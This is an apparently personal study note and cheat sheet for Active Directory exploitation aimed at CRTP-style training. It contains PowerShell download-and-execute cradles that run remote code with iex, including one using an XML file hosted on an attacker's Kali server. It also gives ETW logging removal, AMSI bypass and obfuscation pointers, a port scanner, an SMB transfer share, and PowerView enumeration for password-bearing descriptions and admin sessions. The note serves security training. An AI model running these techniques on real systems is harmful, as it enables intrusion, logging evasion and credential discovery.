---
title: "1 - Powershell"
classes: single
header:  
  teaser: /assets/images/posts/adx/adx-teaser1.jpg
  overlay_image: /assets/images/main/header2.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Starting with Powershell for AD Exploitation!"
description: "Starting with Powershell for AD Exploitation!"
categories:
  - notes
  - adx
tags:
  - beginner
  - AD
  - powershell 
toc: true
---

# Active Directory Exploitation 

> This can be used as an intro for Active Directory Security Content (CRTP for example)

> I've sorted in 4 chapters: Powershell, Bloodhound, Privesc and Lateral Movement

## Powershell

```powershell
% = foreach
$_ = current object 
example: 1,2,3,4 | % {$_+3} = 4,5,6,7
```

```powershell
? = where
eq = equal
ne = not equal
like = similar/comparable
gt = greater than
lt = less than
example: Get-Service | ? {$_.Status -ne "Running"} 
```

```powershell
select = Select-Object
example: Get-Service dhcp | select ServiceName CanPauseAndContinue,DisplayName
```

```powershell
sls = Select-String
example: ls -r <path> -File *.txt | %{ sls -Path $_ -Pattern pass* }
```

Module:
```powershell
C:\$Env:PsModulePath
all modules in this path are imported automatically

# Get-Command -Module <module name>
```

Using New-Object:
```powershell
$variable = New-Object System.Net.WebClient
$variable | gm   //gm = Get-Member
$address= "<web server/file>"
$path = "<full path/file>"
$variable.DownloadFile($address,$path)

iex $variable.DownloadString($address,$path)
# this will "download" the string of the file and the iex = Invoke-Expression will execute the string as a command
```

The cmdlets associated with the process:
```powershell
Get-Command *process* -CommandType cmdlet | Measure-Object
```

verbo "Set":
```powershell
(Get-Command -CommandType cmdlet | Sort-Object Verb | sls ^Set).Count
```

4 processo utilizando mais memoria:
```powershell
ps | Sort-Object -Property WS -Descending | Select-Object -Index 3
```

Portscan:
```powershell
1..1024 | %{echo ((new-object Net.Sockets.TcpClient).Connect("IP",$_)) "Port $_ is open"} 2>$null
```

Download:

Kali: open a webserver with a xml file:
```xml
<?xml version="1.0"?>
<command>
  <a>
    <execute>Set-ExecutionPolicy Bypass -Force -Scope CurrentUser</execute>
  </a>
  <b>
    <execute>Get-Process</execute>
  </b>
</command>
```

Target:
```powershell
$docxml = New-Object System.Xml.XmlDocument
$docxml.Load("http://ip/file.xml"); 
iex $docxml.command.a.execute 
```

Especify user-agent: allows disguising requests
```powershell
$variable.Headers.Add("user-agent","redteam")
iex $variable.DownloadString($address,$path)
```


### AMSI

amsi.fail

Event Tracking for Windows (ETW)
```powershell
C:\Remove-EtwTraceProvider -AutologgerName EventLog-Application -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'

# this command will delete the register key, in other word it disables the ETW
```

Remove the provider ETW in a session:
```powershell
C:\logman update trace EventLog-Application --p Microsoft-Windows-PowerShell -ets
```

### Obfuscation

Invoke-CradleCrafter:

- Generate payload for remote downloads and obfucated scripts

Invoke-Obfuscation:
```powershell
- it does various types of obfuscation and encoding 

first import the module
> Import-Module Invoke-Obfuscation.psd1
```


Impacket has a module that opens a share in  a smb server for file transfer:
```powershell
on Kali   > impacket-smbserver -smb2support <share name> <directory>
on Target > net uset z: \\<kali ip>\<share name>
then just cd to z:
```

```powershell
git reset --hard # update the repository
```

```powershell
pwsh # to open powershel on Linux
```


### Domain Enumeration

show domain info:
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot=$objDomain
$Searcher.filter="samAccountType=805306369"
$Searcher.FindAll()
```

```powershell
$Result=$Searcher.FindAll()
Foreach($obj in $Result){
Foreach($prop in $obj.Properties) {$prop}
Write-Host "---------"}
```

> 805306369 - enum all user accounts

> 805306368 - enum all user machines 

```powershell
change tab name = $host.UI.RawUI.WindowTitle = “AD-MODULE”
```
 
Module AD:

**ADModule**:
```powershell 
Import-Module Microsoft.ActiveDirectory.Management.dll

Get-ADDomain
Get-ADDomain -Identity <domain>
(Get-ADDomain).DomainSID
Get-ADDomainController [-DomainName <domain>]
Get-ADUser -Filter * -Properties * [-Server <domain>]
  Get-ADUser -Identity <user>
  Get-ADUser | gm -MemberType *Property | select name
  Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
  Get-ADUser -Filter ‘Description -like "*pass*” ’-Properties * | select name
Get-ADGroup -Filter * -Properties * | fl name //.count
  Get-ADPrincipalGroupMembership -Identity <user>
  Get-ADGroup -Filter “Name -like ‘*admin*’” | select name
Get-ADGroupMember -Identity “Domain Admins” -Recursive
Get-ADComputer -Filter * -Properties *
```

**PowerView**:
```powershell
dot source to import = . .\powerview.ps1

Get-NetDomain
Get-NetDomain -Domain <domain>
Get-DomainSID
Get-DomainController [-Domain <domain>]
Get-DomainPolicy
  (Get-DomainPolicy).SystemAccess
  ((Get-DomainPolicy).KerberosPolicy

Get-NetUser [(-Domain <domain>) | select name]
  Get-NetUser -Identity <user>
  Get-NetUser | gm //Get-Member
  Get-NetUser | ?{$_.admincount -eq 1} | select name
  Get-NetUser | ?{$_.logoncount -gt 0} | select name
  Get-NetUser 	-Filter “(description=*)” | select name,description

Get-NetGroup [-Domain <domain>]
  Get-NetGroup -UserName <user>
  Get-NetGroup *admin* | select cn
Get-NetGroupMember “Administrators” [-Recurse]

Get-NetLoggedon [-ComputerName <computer>] *admin required
Get-LastLoggedOn [-ComputerName <computer>] *admin required

Get-NetComputer [-Domain] [-Ping] [-OperatingSystem “*Server*”]
Invoke-ShareFinder -verbose //find open shares
Invoke-FileFinder -verbose  // find sensitive info
```

Requires admin priv:
```powershell
Find-LocalAdminAccess -verbose
Invoke-EnumerateLocalADmin 

Get-NetSession
query session

#search where the admin is logged and if the curent user has access
 Invoke-UserHunter -Check Access
 ```
 
 
GPO Enum:
```powershell
> ADModule
Get-ADOrganizationalUnit -Filter * -Properties *
```

```powershell
> PowerView
Get-NetGPO [-ComputerName <name>]
Find-GPOComputerAdmin -ComputerName <name>
Get-NetOU
Get-NetGPO -Identity “{<gplink>}”
```

```powershell
> GPO
Get-GPO -All
Get-GPResultantSetOfPolicy -ReportType HTML -Path C:\file.html
Get-GPO -Guid <gplink>
```


**ACL Enum**:
  
permission to keep an eye:
```powershell
- GenericAll = FullControl
- GenericWrite
- WriteOwner
- WriteDACL
- AllExtendedRights
- ForceChangePassword
- Self (Self-Membership)
```

 
**ADModule**:
```powershell
(Get-ACL ‘AD:\CN=Administrator,CN=Users,DC=alunos,DC=domain,DC=local’).Access

> PowerView
Get-ObjectAcl -samAccountName <user> [-ResolveGUIDs]
Get-NetUser | select name, objectsid
ConvertFrom-SID <sid>
ConvertTo-SID “<user>”
Get-DomainObjectAcl | select @{ Name='<object>'; Expression={ConvertFrom-SID $_.SecurityIdentifier}},ObjectDN,ActiveDirectoryRights
  
Get-ObjectAcl -SamAccountName <user> | select @{ Name='<object>'; Expression={ConvertFrom-SID $_.SecurityIdentifier}},ActiveDirectoryRights
	
Get-ObjectAcl | ? {$_.SecurityIdentifier -match $(ConvertTo-SID “Domain Admins”)} | select ObjectDN,ActiveDirectoryRights

Get-ObjectAcl  -SamAccountName Administrator | ? {$_.ActiveDirectoryRights -match “GenericAll”)} | select @{} Name=”principal ";Expression={ConvertFrom-SID $_.SecurityIdentifier}}
	
Invoke-ACLScanner -ResolveGUIDs	
Get-PathAcl -path “\\dc.domain.local\sysvol”
Get-ObjectAcl -ADSPath “LDAP://CN=Domain Admins,CN=Group,DC=domain, DC=local”
```



Domain Trusts  Enum
 ```powershell
- Unidirectional = If A trusts B, B can access A 
- Bidirectional = both can access 
- Transitive = if A trusts B, and B trusts C then A trusts C
- Non-Transitive = A does not trust C
```


PowerView:
```powershell
Get-NetDomainTrust [-Domain <domain>]
```

ADModule:
```powershell
Get-ADTrust -Filter * [-Identity <domain>]
```

Forest Enum:
```powershell
> PowerView
Get-NetForest [-Forest <forest>]
Get-NetForestDomain [-Forest <forest>]
Get-NetForestCatalog [-Forest <forest>]
Get-NetForestTrust [-Forest <forest>]
```

```powershell
> ADModule
Get-ADForest [-Identity <forest>]
(Get-ADForest).Domains
Get-ADForest | Select -ExpandProperty GlobalCatalogs
```


Extra enum:

```powershell
> PowerView

*local admin required
this goes through RPC and SMB ports:
Find-LocalAdminAccess -Verbose [-Thread <int>]
Invoke-CheckLocalAdminAccess

Invoke-EnumerateLocalAdmin -Verbose
Get-NetLocalGroup
```

using WMI is more stealthy:
```powershell
Find-WMILocalAdminAccess.ps1
source: https://github.com/admin0987654321/admin1/blob/master/Find-WMILocalAdminAccess.ps1
```

Find where the domain admin has an open session:
```powershell
Invoke-UserHunter [-GroupName <name> -Domain <domain> -CheckAccess -Stealth]
Get-NetSession
Get-NetLoggedOn
```

```powershell
enum without PowerShell

PywerView = https://github.com/the-useless-one/pywerview
WindapSearch = https://github.com/ropnop/windapsearch
```
